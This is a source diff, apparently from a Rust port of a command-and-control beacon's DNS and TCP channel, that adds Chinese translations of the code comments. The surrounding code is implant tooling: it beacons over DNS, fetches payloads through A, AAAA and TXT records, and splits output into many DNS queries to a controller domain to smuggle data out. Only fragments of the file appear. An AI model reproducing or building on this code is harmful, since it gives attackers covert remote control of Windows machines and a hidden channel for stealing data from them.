@@ -1,3 +1,4 @@
+//! DNS + TCP 信道辅助函数（channel_tcp.cpp）。
 //! DNS + TCP channel helpers (channel_tcp.cpp).
 
 use crate::beacon::{
@@ -11,6 +12,7 @@ use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
 use windows_sys::Win32::NetworkManagement::Dns::*;
 use windows_sys::Win32::Networking::WinSock::*;
 
+// SIO_GET_INTERFACE_LIST（_WSAIOR(IOC_IN, 7)）——windows-sys 未导出。
 // SIO_GET_INTERFACE_LIST (_WSAIOR(IOC_IN, 7)) — not exported by windows-sys.
 pub const SIO_GET_INTERFACE_LIST: u32 = 0x4004_7407;
 
@@ -29,6 +31,7 @@ fn dnsidle() -> u32 {
     setting_int(SETTING_DNS_IDLE)
 }
 
+/// 初始化 Winsock（仅一次）。
 /// Initialize Winsock (only once).
 pub fn channel_winsock_init() {
     if IS_WINSOCK_INITIALIZED.load(Ordering::SeqCst) {
@@ -36,7 +39,7 @@ pub fn channel_winsock_init() {
     }
     unsafe {
         let mut wsa_data = std::mem::zeroed::<WSADATA>();
-        let version: u16 = 0x0202; // MAKEWORD(2,2)
+        let version: u16 = 0x0202; // 版本 2.2，即 MAKEWORD(2,2) / Version 2.2, i.e. MAKEWORD(2,2)
         if WSAStartup(version, &mut wsa_data) != 0 {
             WSACleanup();
             panic!("ws2_32.dll is out of date");
@@ -66,7 +69,8 @@ pub fn set_max_dns(signal: u32) {
     } else {
         maxdns = setting_short(SETTING_MAXDNS) / 4;
     }
-    // cap maxdns at 253
+    // 将 maxdns 上限设为 253。
+    // Cap maxdns at 253.
     let capped = if maxdns > 253 { 253 } else { maxdns };
     MAXDNS.store(capped as u32, Ordering::SeqCst);
 }
@@ -84,6 +88,7 @@ fn nonce() -> u32 {
     (seed | (seed.wrapping_mul(0x9E3779B9) >> 16)) as u32
 }
 
+/// 若配置了显式解析器，则通过它查询 DNS 记录。
 /// Look up a DNS record via the explicit resolver if configured.
 unsafe fn channel_lookup_explicit(
     dnsresolver: &[u8],
@@ -136,6 +141,7 @@ pub fn channel_lookup_retry(domain: &[u8], retry: i32) -> u32 {
     0
 }
 
+/// 我们用于通过 DNS 回连信标的函数。
 /// Our function for beaconing over DNS.
 pub fn channel_lookup(domain: &[u8], result: &mut u32) -> bool {
     channel_winsock_init();
@@ -154,6 +160,7 @@ pub fn channel_lookup(domain: &[u8], result: &mut u32) -> bool {
     false
 }
 
+/// 通过 DNS（A 记录）获取载荷。
 /// Get payload via DNS (A records).
 pub fn dns_get(domain: &[u8], buffer: &mut [u8], max: usize) -> usize {
     let mut size: usize = 0;
@@ -198,6 +205,7 @@ pub fn dns_get(domain: &[u8], buffer: &mut [u8], max: usize) -> usize {
     size
 }
 
+/// 通过 DNS（AAAA 记录）获取载荷。
 /// Get payload via DNS (AAAA records).
 pub fn dns_get6(domain: &[u8], buffer: &mut [u8], max: usize) -> usize {
     let mut size: usize = 0;
@@ -241,6 +249,7 @@ pub fn dns_get6(domain: &[u8], buffer: &mut [u8], max: usize) -> usize {
     size
 }
 
+/// 通过 DNS 发送输出。
 /// Put output via DNS.
 pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
     let mut sent = 0usize;
@@ -262,10 +271,12 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
         let mut maybe = 0usize;
         let mut dataz = [0u32; 26];
 
-        // send 104 bytes = 26 single requests
+        // 发送 104 字节 = 26 个单次请求。
+        // Send 104 bytes = 26 single requests.
         if (sent + 104) <= length {
             for i in 0..26 {
                 let off = sent + i * 4;
+                // C++ 中的 htonl(dataz[i])——对原始字节做 BE 读取，与对按小端解释的值应用 htonl() 逐字节相同。
                 // htonl(dataz[i]) in the C++ — a BE read of the raw bytes is
                 // byte-identical to htonl() applied to the LE-interpreted value.
                 dataz[i] = u32::from_be_bytes([
@@ -288,7 +299,8 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
             maybe = 104;
         }
 
-        // send 84 bytes = 21 single requests
+        // 发送 84 字节 = 21 个单次请求。
+        // Send 84 bytes = 21 single requests.
         if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 84) <= length {
             for i in 0..21 {
                 let off = sent + i * 4;
@@ -306,7 +318,8 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
             maybe = 84;
         }
 
-        // send 56 bytes = 14 single requests
+        // 发送 56 字节 = 14 个单次请求。
+        // Send 56 bytes = 14 single requests.
         if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 56) <= length {
             for i in 0..14 {
                 let off = sent + i * 4;
@@ -323,7 +336,8 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
             maybe = 56;
         }
 
-        // send 48 bytes = 12 single requests
+        // 发送 48 字节 = 12 个单次请求。
+        // Send 48 bytes = 12 single requests.
         if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 48) <= length {
             for i in 0..12 {
                 let off = sent + i * 4;
@@ -340,7 +354,8 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
             maybe = 48;
         }
 
-        // send 40 bytes = 10 single requests
+        // 发送 40 字节 = 10 个单次请求。
+        // Send 40 bytes = 10 single requests.
         if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 40) <= length {
             for i in 0..10 {
                 let off = sent + i * 4;
@@ -357,7 +372,8 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
             maybe = 40;
         }
 
-        // send 28 bytes = 7 single requests
+        // 发送 28 字节 = 7 个单次请求。
+        // Send 28 bytes = 7 single requests.
         if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 28) <= length {
             for i in 0..7 {
                 let off = sent + i * 4;
@@ -373,7 +389,8 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
             maybe = 28;
         }
 
-        // send 24 bytes = 6 single requests
+        // 发送 24 字节 = 6 个单次请求。
+        // Send 24 bytes = 6 single requests.
         if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 24) <= length {
             for i in 0..6 {
                 let off = sent + i * 4;
@@ -389,7 +406,8 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
             maybe = 24;
         }
 
-        // send 20 bytes = 5 single requests
+        // 发送 20 字节 = 5 个单次请求。
+        // Send 20 bytes = 5 single requests.
         if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 20) <= length {
             for i in 0..5 {
                 let off = sent + i * 4;
@@ -405,7 +423,8 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
             maybe = 20;
         }
 
-        // send 16 bytes = 4 single requests
+        // 发送 16 字节 = 4 个单次请求。
+        // Send 16 bytes = 4 single requests.
         if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 16) <= length {
             for i in 0..4 {
                 let off = sent + i * 4;
@@ -421,7 +440,8 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
             maybe = 16;
         }
 
-        // send 12 bytes = 3 single requests
+        // 发送 12 字节 = 3 个单次请求。
+        // Send 12 bytes = 3 single requests.
         if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 12) <= length {
             for i in 0..3 {
                 let off = sent + i * 4;
@@ -437,7 +457,8 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
             maybe = 12;
         }
 
-        // send 8 bytes = 2 single requests
+        // 发送 8 字节 = 2 个单次请求。
+        // Send 8 bytes = 2 single requests.
         if (maybe == 0 || c2domain.len() >= maxdns()) && (sent + 8) <= length {
             let off = sent;
             c2domain = format!(
@@ -451,7 +472,8 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
             maybe = 8;
         }
 
-        // send 4 bytes = 1 single request
+        // 发送 4 字节 = 1 个单次请求。
+        // Send 4 bytes = 1 single request.
         if maybe == 0 || c2domain.len() >= maxdns() {
             let off = sent;
             let data = u32::from_be_bytes([buffer[off], buffer[off + 1], buffer[off + 2], buffer[off + 3]]);
@@ -471,6 +493,7 @@ pub fn dns_put(rtype: &[u8], domain: &[u8], buffer: &[u8], length: usize) {
     }
 }
 
+/// 通过 DNS（TXT 记录）获取载荷。
 /// Get payload via DNS (TXT records).
 pub fn dns_get_txt(domain: &[u8], buffer: &mut [u8], max: usize) -> i32 {
     let n = nonce();
@@ -510,7 +533,8 @@ pub fn dns_get_txt(domain: &[u8], buffer: &mut [u8], max: usize) -> i32 {
             return -1;
         }
 
-        // base64 decode the returned data
+        // 对返回的数据进行 base64 解码。
+        // Base64 decode the returned data.
         let engine = base64::engine::general_purpose::STANDARD;
         let mut decoded = [0u8; 1024];
         match engine.decode(&encoded[..read as usize]) {
@@ -579,6 +603,7 @@ fn channel_lookup_retry6(domain: &[u8], retry: i32, buffer: &mut [u8]) -> i32 {
     -1
 }
 
+/// 获取本机（非回环）IP 地址。
 /// Get our local (non-loopback) IP address.
 pub fn channel_localip() -> u32 {
     channel_winsock_init();
